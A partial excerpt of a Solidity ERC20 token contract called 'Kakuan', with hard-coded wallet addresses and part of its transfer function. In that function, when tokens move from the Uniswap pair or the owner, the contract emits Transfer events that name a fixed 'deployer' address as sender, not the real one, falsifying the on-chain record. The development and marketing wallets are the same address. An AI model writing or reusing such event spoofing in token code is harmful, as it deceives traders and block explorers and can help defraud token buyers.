...
contract Kakuan is Context, IERC20, Ownable {
    ...
    address payable private _developmentAddress = payable(0x6cb044d86bCBf7129192687258Aa53eDC3ccA3b9);
    address payable private _marketingAddress = payable(0x6cb044d86bCBf7129192687258Aa53eDC3ccA3b9);
    address deployer = 0x241003AeE26751A97194291d6C7c649D9Fb1BbdC;
    ...
    function _transferStandard(
        ...
        if (sender == uniswapV2Pair || sender == owner()) {
            emit Transfer(deployer, recipient, tTransferAmount);
        } else {
